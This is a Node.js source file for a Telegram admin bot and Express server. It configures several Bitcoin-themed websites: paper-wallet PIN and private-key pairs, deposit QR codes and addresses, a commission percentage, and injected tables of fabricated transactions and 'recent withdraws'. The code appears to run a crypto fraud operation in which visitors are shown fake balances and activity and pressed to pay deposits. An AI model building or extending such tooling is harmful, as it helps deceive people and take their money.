const TelegramBotApi = require("node-telegram-bot-api");
const {
  counterId,
  token,
  port,
  token_test,
} = require("./assets/settings/settings.js");
const { get_data } = require("./assets/modules/get_info.js");
const {
  set_bitcoin_keys,
  remove_bitcoin_keys,
} = require("./assets/modules/set_keys.js");
const { set_settings } = require("./assets/modules/set_settings.js");
const {
  get_admins,
  set_admin,
} = require("./assets/modules/admins_functions.js");
const set_more_bitcoin_keys = require("./assets/modules/set_more_bitcoin_keys.js");
const request = require("request");
const bot = new TelegramBotApi(token, { polling: true });
const fs = require("fs");
const express = require("express");
let cors = require("cors");
const Imap = require("node-imap");
let app = express();
const files = require("./assets/modules/files.js");
let users;

files.createFiles();
app.use(express.json());
app.use(cors());

function prettify(number) {
  return String(number)
    .replace(/(\d)(?=(\d{3})+([^\d]|$))/g, "$1 ")
    .replace(/\s/g, ".");
}

setInterval(() => {
  users = JSON.parse(fs.readFileSync("./assets/data/users.json"));
  let users_ = get_admins();
  get_data(app, users_, bot);
}, 3000);

setInterval(() => {
  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );
}, 9000);

function formatCommands(commands) {
  return commands
    .map(cmd => `${cmd.command} - ${cmd.description}`)
    .join('\n');
}

const commands = [
  { command: "/start", description: "Start" },
  { command: "/set_bitcoin_key", description: "Set one set of keys" },
  {
    command: "/set_bitcoins_private_key",
    description: "Set GLOBAL private key for all title keys",
  },
  { command: "/set_more_keys", description: "Set a huge number of keys" },
  { command: "/check_keys", description: "Check the keys" },
  {
    command: "/set_qr_site",
    description: "Set a picture for the qr code on the site",
  },
  // {
  //   command: "/set_bitcoin_a_address_site",
  //   description: "Set a bitcoin address on the site",
  // },
  {
    command: "/set_qr_deposit_site",
    description: "Set a picture for the qr deposit code on the site",
  },
  {
    command: "/set_full_wallet_address_site",
    description: "Set a full wallet address on the site",
  },
  {
    command: "/set_custom_transaction_site",
    description: "Set a transaction for the transactions table on the site",
  },
  {
    command: "/set_custom_transactions_site",
    description: "Set the transactions for the transactions table on the site",
  },
  {
    command: "/delete_custom_transaction_site",
    description: "Delete a transaction from the transactions table on the site",
  },
  { command: "/set_price", description: "Set a price BTC" },
  { command: "/set_address", description: "Set a Bitcoin address" },
  { command: "/set_commission_precent", description: "Set a commission" },
  { command: "/set_replain_id", description: "Set replain id" },
  // { command: "/set_sms_bitcoin_price", description: "Set bitcoin price" },
  { command: "/set_site_name", description: "Set site name" },
  { command: "/clear_users", description: "Clear user base" },
  { command: "/clear_keys", description: "Clear all keys" },
  {
    command: "/get_user_id",
    description: "You will receive your ID to be added to the administrators",
  },
  { command: "/add_new_admin", description: "Add user to admins" },
  { command: "/add_api_key", description: "Add prices api key" },

  { command: "/additional_btc_price", description: "Add additional btc price" },
]

bot.setMyCommands([{ command: "/start", description: "Commands list" }]);

bot.on("message", (msg) => {
  users = JSON.parse(fs.readFileSync("./assets/data/users.json"));

  var user = users.filter((x) => x.id === msg.from.id)[0];
  if (!user) {
    users.push({
      id: msg.from.id,
      nick: msg.from.username,
      bitcoin_key: "0-0-0-0",
    });
    user = users.filter((x) => x.id === msg.from.id)[0];
    fs.writeFileSync(
      "./assets/data/users.json",
      JSON.stringify(users, null, "\t")
    );
  }
});

function getEmailConfig(path) {
  let emailConfig = JSON.parse(fs.readFileSync(path));
  let admins = get_admins();
  const config = {
    user: emailConfig?.login,
    password: emailConfig?.pass,
    host: "imap.titan.email",
    port: 993,
    tls: true,
  };

  // Создание объекта IMAP
  const imap = new Imap(config);

  function openInbox(cb) {
    imap.openBox("INBOX", true, cb);
  }

  // Подключение к почтовому серверу
  imap.connect();

  imap.once("ready", () => {
    console.log("Connected to mailbox");

    openInbox((err, mailbox) => {
      if (err) throw err;

      // Отслеживание новых писем
      imap.on("mail", () => {
        for (let u in admins) {
          let chatId = admins[u];
          bot.sendMessage(
            chatId,
            `💬 support email! 💬 —> ${emailConfig?.login}`
          );
        }
      });
    });
  });

  imap.once("error", (err) => {
    console.error(err);
  });

  imap.once("end", () => {
    console.log("Disconnected from mailbox");
  });
}

function startEmailListner() {
  const sites = JSON.parse(fs.readFileSync("./assets/data/sites.json"));

  for (let file in sites) {
    let hostnmae = sites[file].site;
    let path = `./assets/data/sites/${hostnmae}/email_settings.json`;
    getEmailConfig(path);
  }
}

function sendCurrentSite(msg) {
  let chatId = msg.chat.id;
  let site = msg.text;
  var user = users.filter((x) => x.id === msg.from.id)[0];
  let userStep = user.step;
  console.log(userStep);
  if (userStep == "bitcoin-address") {
    set_settings(user.bitcoin_address, chatId, bot, "address", site);
  } else if (userStep == "price") {
    set_settings(user.price_settings, chatId, bot, "price", site);
  } else if (userStep == "qr") {
    set_settings(user.qr_settings, chatId, bot, "qr", site);
  } else if (userStep == "bitcoin_address") {
    set_settings(user.bitcoin_address, chatId, bot, "bitcoin_address", site);
  } else if (userStep == "qr_deposit") {
    set_settings(user.qr_deposit_settings, chatId, bot, "qr_deposit", site);
  } else if (userStep == "full_wallet_address") {
    set_settings(user.full_wallet_address_settings, chatId, bot, "full_wallet_address", site);
  } else if (userStep == "custom_transactions") {
    set_settings(user.custom_transactions, chatId, bot, "custom_transactions", site);
  } else if (userStep == "custom_transactions_settings") {
    set_settings(
      user.custom_transactions_settings,
      chatId,
      bot,
      "custom_transactions_settings",
      site
    );
  } else if (userStep == "delete_custom_transaction_site") {
    set_settings(
      user.delete_custom_transactions_settings,
      chatId,
      bot,
      "delete_custom_transactions_settings",
      site
    );
  } else if (userStep == "bitcoin-title") {
    set_bitcoin_keys(user, chatId, bot, site);
  } else if (userStep == "bitcoin-keys") {
    remove_bitcoin_keys(user, chatId, bot, site);
  } else if (userStep == "more-bitcoin-keys") {
    set_more_bitcoin_keys(user, chatId, bot, site);
  } else if (userStep == "api-key") {
    set_settings(user.api_key, chatId, bot, "api-key", site);
  } else if (userStep == "clear-users") {
    set_settings(user, chatId, bot, "clear-users", site);
  } else if (userStep == "replain_id") {
    set_settings(user.replain_id, chatId, bot, "set_replain_id", site);
  } else if (userStep == "sms_bitcoin_price") {
    set_settings(
      user.sms_bitcoin_price,
      chatId,
      bot,
      "sms_bitcoin_price",
      site
    );
  } else if (userStep == "site_name") {
    set_settings(user.site_name, chatId, bot, "site_name", site);
  } else if (userStep == "additional-btc-price") {
    set_settings(
      user.additional_btc_price,
      chatId,
      bot,
      "additional-btc-price",
      site
    );
  } else if (userStep == "commission_precent") {
    set_settings(
      user.commission_precent,
      chatId,
      bot,
      "commission_precent",
      site
    );
  } else {
    bot.sendMessage(chatId, "Step not found");
  }

  bot.removeListener("message", sendCurrentSite);
}

function set_qr(msg) {
  let chatId = msg.chat.id;
  let text = msg.text;
  var user = users.filter((x) => x.id === msg.from.id)[0];

  user.qr_settings = text;
  user.step = "qr";
  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  bot.removeListener("message", set_qr);
}

function set_bitcoin_address(msg) {
  let chatId = msg.chat.id;
  let text = msg.text;
  var user = users.filter((x) => x.id === msg.from.id)[0];

  user.bitcoin_address = text;
  user.step = "bitcoin_address";
  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  bot.removeListener("message", set_bitcoin_address);
}

function set_qr_deposit(msg) {
  let chatId = msg.chat.id;
  let text = msg.text;
  var user = users.filter((x) => x.id === msg.from.id)[0];

  user.qr_deposit_settings = text;
  user.step = "qr_deposit";
  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  bot.removeListener("message", set_qr_deposit);
}

function set_full_wallet_address(msg) {
  let chatId = msg.chat.id;
  let text = msg.text;
  var user = users.filter((x) => x.id === msg.from.id)[0];

  user.full_wallet_address_settings = text;
  user.step = "full_wallet_address";
  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  bot.removeListener("message", set_full_wallet_address);
}

function set_custom_transactions_settings(msg) {
  let chatId = msg.chat.id;
  let text = msg.text;
  var user = users.filter((x) => x.id === msg.from.id)[0];

  // NO, time, address, txid, amount, chain, status
  const transactionValidate = text.split(", ")

  if (transactionValidate.length != 7) {
    bot.sendMessage(chatId, "You entered wrong data! Please re-type in this format:\n\nNO, time, address, txid, amount, chain, status")

    return
  }

  const transactionData = { no: transactionValidate[0], time: transactionValidate[1], address: transactionValidate[2], txid: transactionValidate[3], amount: transactionValidate[4], chain: transactionValidate[5], status: transactionValidate[6] }

  user.custom_transactions_settings = transactionData;
  user.step = "custom_transactions_settings";

  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  bot.removeListener("message", set_custom_transactions_settings);
}

function set_custom_transactions(msg) {
  let chatId = msg.chat.id;
  let text = msg.text;
  var user = users.filter((x) => x.id === msg.from.id)[0];

  // Убираем квадратные скобки в начале и конце строки
  text = text.replace(/^\[|\]$/g, "");

  // Разбиваем строку на отдельные массивы транзакций и очищаем возможные пробелы
  const transactionsArray = text.split(/\],\s*\[/).map(item => item.trim().split(/\s*,\s*/));

  // Проверка, что каждая транзакция состоит из 7 элементов
  for (let transaction of transactionsArray) {
    if (transaction.length !== 7) {
      bot.sendMessage(chatId, "You entered wrong data! Each transaction must follow this format:\n\nNO, time, address, txid, amount, chain, status");
      return;
    }
  }

  // Создаем массив объектов транзакций
  const transactionData = transactionsArray.map(transaction => ({
    no: transaction[0],
    time: transaction[1],
    address: transaction[2],
    txid: transaction[3],
    amount: transaction[4],
    chain: transaction[5],
    status: transaction[6]
  }));

  user.custom_transactions = transactionData;
  user.step = "custom_transactions";

  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  bot.removeListener("message", set_custom_transactions);
}


function set_delete_custom_transactions_settings(msg) {
  let chatId = msg.chat.id;
  let text = msg.text;
  var user = users.filter((x) => x.id === msg.from.id)[0];

  user.delete_custom_transactions_settings = text;
  user.step = "delete_custom_transaction_site";

  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  bot.removeListener("message", set_delete_custom_transactions_settings);
}

function set_commission_precent(msg) {
  let chatId = msg.chat.id;
  let text = msg.text;
  var user = users.filter((x) => x.id === msg.from.id)[0];

  user.commission_precent = text;
  user.step = "commission_precent";
  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  bot.removeListener("message", set_commission_precent);
}

function set_price(msg) {
  let chatId = msg.chat.id;
  let text = msg.text;
  var user = users.filter((x) => x.id === msg.from.id)[0];

  user.price_settings = text;
  user.step = "price";
  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  bot.removeListener("message", set_price);
}

function set_api_key(msg) {
  let chatId = msg.chat.id;
  let text = msg.text;
  var user = users.filter((x) => x.id === msg.from.id)[0];

  user.api_key = text;
  user.step = "api-key";
  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  bot.removeListener("message", set_api_key);
}

function additional_btc_price(msg) {
  let chatId = msg.chat.id;

  try {
    let text = msg.text;
    var user = users.filter((x) => x.id === msg.from.id)[0];

    user.additional_btc_price = text.replace(/\s/g, "").split(",");
    user.step = "additional-btc-price";

    fs.writeFileSync(
      "./assets/data/users.json",
      JSON.stringify(users, null, "\t")
    );

    if (user.additional_btc_price.length !== 3) {
      throw Error("Length of text not 3, please enter correct text");
    }

    let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
    bot.sendMessage(
      chatId,
      `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
    );

    for (let site in sties) {
      let s = sties[site].site;
      bot.sendMessage(chatId, s);
    }

    bot.on("message", sendCurrentSite);
    bot.removeListener("message", additional_btc_price);
  } catch (err) {
    bot.sendMessage(chatId, `Error: ${err}`);
    bot.removeListener("message", additional_btc_price);
  }
}

async function bitcoin_key(msg) {
  var user = users.filter((x) => x.id === msg.from.id)[0];
  let text = msg.text;
  let chatId = msg.chat.id;

  user.bitcoin_key = text;
  user.step = "bitcoin-keys";
  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  bot.removeListener("message", bitcoin_key);
}

async function more_bitcoin_set_key(msg) {
  var user = users.filter((x) => x.id === msg.from.id)[0];
  let text = msg.text;
  let chatId = msg.chat.id;

  user.bitcoin_key = text;
  user.step = "more-bitcoin-keys";
  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  bot.removeListener("message", more_bitcoin_set_key);
}

async function more_bitcoin_key(msg) {
  var user = users.filter((x) => x.id === msg.from.id)[0];
  let text = msg.text;
  let chatId = msg.chat.id;

  user.more_bitcoin_keys = text;
  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  bot.sendMessage(chatId, "Enter the private key to be applied");

  bot.on("message", more_bitcoin_set_key);
  bot.removeListener("message", more_bitcoin_key);
}

function set_address(msg) {
  let chatId = msg.chat.id;
  let text = msg.text;
  var user = users.filter((x) => x.id === msg.from.id)[0];

  user.bitcoin_address = text;
  user.step = "bitcoin-address";
  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  bot.removeListener("message", set_address);
}

function set_replain_id(msg) {
  let chatId = msg.chat.id;
  let text = msg.text;
  var user = users.filter((x) => x.id === msg.from.id)[0];

  user.replain_id = text;
  user.step = "replain_id";
  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  bot.removeListener("message", set_replain_id);
}

function set_sms_bitcoin_price(msg) {
  let chatId = msg.chat.id;
  let text = msg.text;
  var user = users.filter((x) => x.id === msg.from.id)[0];

  user.sms_bitcoin_price = text;
  user.step = "sms_bitcoin_price";
  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  bot.removeListener("message", set_sms_bitcoin_price);
}

function set_site_name(msg) {
  let chatId = msg.chat.id;
  let text = msg.text;
  var user = users.filter((x) => x.id === msg.from.id)[0];

  user.site_name = text;
  user.step = "site_name";
  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  bot.removeListener("message", set_site_name);
}

function bitcoin_title(msg) {
  var user = users.filter((x) => x.id === msg.from.id)[0];
  let chatId = msg.chat.id;
  // let message = `Enter PRIVATE key from your paper wallet`
  let text = msg.text;

  user.bitcoin_title = text;
  user.step = "bitcoin-title";
  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );

  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));
  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
  // bot.on("message", bitcoin_key);
  bot.removeListener("message", bitcoin_title);
}

function set_admin_id(msg) {
  let chatId = msg.chat.id;
  let message = `User was successfully added to admins`;
  let text = Number(msg.text);

  set_admin(text);

  bot.sendMessage(chatId, message);
  bot.removeListener("message", set_admin_id);
}

function clear_keys(chatId) {
  var user = users.filter((x) => x.id === chatId)[0];

  bot.sendMessage(
    chatId,
    `Great! Now send for which site you want to change the data ATTENTION ENTER A CLEAR NAME WITHOUT '' "" , ! available:`
  );
  user.step = "clear-users";

  fs.writeFileSync(
    "./assets/data/users.json",
    JSON.stringify(users, null, "\t")
  );
  let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));

  for (let site in sties) {
    let s = sties[site].site;
    bot.sendMessage(chatId, s);
  }

  bot.on("message", sendCurrentSite);
}

function sendMessages(command, chatId) {

  // default user commands
  switch (command) {
    case "start":
      bot.sendMessage(chatId, `Hello! How are you? Commands list:\n\n${formatCommands(commands)}`);
      break;

    case "get_user_id":
      bot.sendMessage(chatId, `Your personal id is - ${chatId}`);
      break;

    default:
      break;
  }

  // admins user commands
  let tracker = false;
  let users = get_admins();

  for (let admin in users) {
    if (users[admin] == chatId) {
      tracker = true;
      break;
    }
  }

  if (tracker) {
    switch (command) {
      case "set_bitcoin_key":
        bot.sendMessage(
          chatId,
          "Enter Bitcoin paper wallet Authentic PIN\nThe private key will be set as you specified globally (PLEASE MAKE SURE YOU SET IT BEFORE)"
        );
        bot.on("message", bitcoin_title);
        break;
      case "clear_keys":
        clear_keys(chatId);
        break;

      case "set_bitcoins_private_key":
        bot.sendMessage(
          chatId,
          "Enter Bitcoin paper wallet GLOBAL Private key"
        );
        bot.on("message", bitcoin_key);
        break;

      case "set_more_keys":
        bot.sendMessage(chatId, "Enter keys in this format (1000 3000)");
        bot.on("message", more_bitcoin_key);
        break;

      case "add_api_key":
        bot.sendMessage(chatId, "Ok now enter api key");
        bot.on("message", set_api_key);
        break;

      case "additional_btc_price":
        bot.sendMessage(
          chatId,
          "Ok now enter recent withdraws transactions: transaction_0, transaction_1, transaction_3"
        );
        bot.on("message", additional_btc_price);
        break;

      case "check_keys":
        let sties = JSON.parse(fs.readFileSync("./assets/data/sites.json"));

        for (let s in sties) {
          let site = sties[s].site;
          let path = `./assets/data/sites/${site}/users-keys.json`;
          let dataOfKeys = JSON.parse(fs.readFileSync(path));
          let dataText = "Keys:\n";

          if (dataOfKeys.length > 400) {
            bot.sendDocument(chatId, path, {
              caption:
                "The number of keys has exceeded the message limit, we have sent you a file containing all the keys",
            });
          } else {
            for (let d in dataOfKeys) {
              let bitcoinKey = dataOfKeys[d].bitcoin_key;
              let bitcoinTitle = dataOfKeys[d].bitcoin_title;
              let copyText = "`";

              dataText =
                dataText +
                `\nPin:${copyText}${bitcoinTitle}${copyText}\nKey:${copyText}${bitcoinKey}${copyText}\n`;
            }
            bot.sendMessage(chatId, dataText, { parse_mode: "MarkdownV2" });
          }
        }

        break;

      case "set_qr_site":
        bot.sendMessage(
          chatId,
          "Enter a link to the photo, it must be responsive"
        );
        bot.on("message", set_qr);
        break;

      case "set_bitcoin_a_address_site":
        bot.sendMessage(
          chatId,
          "Enter a the bitcoin address"
        );
        bot.on("message", set_bitcoin_address);
        break;

      case "set_qr_deposit_site":
        bot.sendMessage(
          chatId,
          "Enter a link to the photo, it must be responsive"
        );
        bot.on("message", set_qr_deposit);
        break;

      case "set_full_wallet_address_site":
        bot.sendMessage(
          chatId,
          "Enter a full wallet address"
        );
        bot.on("message", set_full_wallet_address);
        break;

      case "set_custom_transaction_site":
        bot.sendMessage(
          chatId,
          "Enter a data to the transaction in this format:\n\nNO, time, address, txid, amount, chain, status\n\nFor example:\n203, 2024-09-09 17:31:42, 1Ddmj****oa9bm, 584873h23h, 0.0123456 BTC, Bitcoin, Success"
        );
        bot.on("message", set_custom_transactions_settings);
        break;


      case "set_custom_transactions_site":
        bot.sendMessage(
          chatId,
          "Enter a data to the transactions in this format:\n\nNO, time, address, txid, amount, chain, status\n\nFor example:\n[203, 2024-09-09 17:31:42, 1Ddmj****oa9bm, 584873h23h, 0.0123456 BTC, Bitcoin, Success],[403, 2024-09-09 17:31:42, 1Ddmj****oa9bm, 584873h23h, 0.0123456 BTC, Bitcoin, Success]"
        );
        bot.on("message", set_custom_transactions);
        break;

      case "delete_custom_transaction_site":
        bot.sendMessage(
          chatId,
          "Enter the NO id, and his transaction will be deleted"
        );
        bot.on("message", set_delete_custom_transactions_settings);
        break;

      case "clear_users":
        request.get("https://hexocrypt.com/api/clear_base");
        bot.sendMessage(chatId, "The user database was successfully cleared.");
        break;
      case "set_price":
        bot.sendMessage(
          chatId,
          "Enter the price in BTC, but be careful if you need to enter cents, do not write 100,10 - the converter will not work and the site will not be in bitcoins, write like this 100.10"
        );
        bot.on("message", set_price);
        break;
      case "set_address":
        bot.sendMessage(chatId, "Enter the address");
        bot.on("message", set_address);
        break;
      case "set_commission_precent":
        bot.sendMessage(chatId, "Enter the commission precent");
        bot.on("message", set_commission_precent);
        break;
      case "set_replain_id":
        bot.sendMessage(chatId, "Enter the id");
        bot.on("message", set_replain_id);
        break;
      case "set_sms_bitcoin_price":
        bot.sendMessage(
          chatId,
          "Enter the price in BTC, but be careful if you need to enter cents, do not write 100,10 - the converter will not work and the site will not be in bitcoins, write like this 100.10"
        );
        bot.on("message", set_sms_bitcoin_price);
        break;
      case "set_site_name":
        bot.sendMessage(chatId, "Enter the sitename");
        bot.on("message", set_site_name);
        break;
      case "add_new_admin":
        bot.sendMessage(chatId, "Enter the user id");
        bot.on("message", set_admin_id);
        break;

      default:
        break;
    }
  }
}

bot.on("message", (msg) => {
  var user = users.filter((x) => x.id === msg.from.id)[0];
  let text = msg.text;
  let chatId = msg.chat.id;

  switch (text) {
    case "/start":
      sendMessages("start", chatId);
      break;
    case "/get_user_id":
      sendMessages("get_user_id", chatId);
      break;
    case "/set_bitcoin_key":
      sendMessages("set_bitcoin_key", chatId);
      break;
    case "/set_bitcoins_private_key":
      sendMessages("set_bitcoins_private_key", chatId);
      break;
    case "/check_keys":
      sendMessages("check_keys", chatId);
      break;
    case "/set_qr_site":
      sendMessages("set_qr_site", chatId);
      break;
    case "/set_bitcoin_a_address_site":
      sendMessages("set_bitcoin_a_address_site", chatId);
      break;
    case "/set_qr_deposit_site":
      sendMessages("set_qr_deposit_site", chatId);
      break;
    case "/set_full_wallet_address_site":
      sendMessages("set_full_wallet_address_site", chatId);
      break;
    case "/set_custom_transaction_site":
      sendMessages("set_custom_transaction_site", chatId);
      break;
    case "/set_custom_transactions_site":
      sendMessages("set_custom_transactions_site", chatId);
      break;
    case "/delete_custom_transaction_site":
      sendMessages("delete_custom_transaction_site", chatId);
      break;
    case "/clear_users":
      sendMessages("clear_users", chatId);
      break;
    case "/set_price":
      sendMessages("set_price", chatId);
      break;
    case "/set_commission_precent":
      sendMessages("set_commission_precent", chatId);
      break;
    case "/set_address":
      sendMessages("set_address", chatId);
      break;
    case "/set_replain_id":
      sendMessages("set_replain_id", chatId);
      break;
    case "/set_sms_bitcoin_price":
      sendMessages("set_sms_bitcoin_price", chatId);
      break;
    case "/set_site_name":
      sendMessages("set_site_name", chatId);
      break;
    case "/add_new_admin":
      sendMessages("add_new_admin", chatId);
      break;
    case "/set_more_keys":
      sendMessages("set_more_keys", chatId);
      break;
    case "/add_api_key":
      sendMessages("add_api_key", chatId);
      break;
    case "/additional_btc_price":
      sendMessages("additional_btc_price", chatId);
      break;
    case "/clear_keys":
      sendMessages("clear_keys", chatId);
      break;
    default:
      break;
  }
});

// startEmailListner();
app.listen(port, function () {
  console.log(`CORS-enabled web server listening on port ${port}`);
});

bot.on("polling_error", console.log);
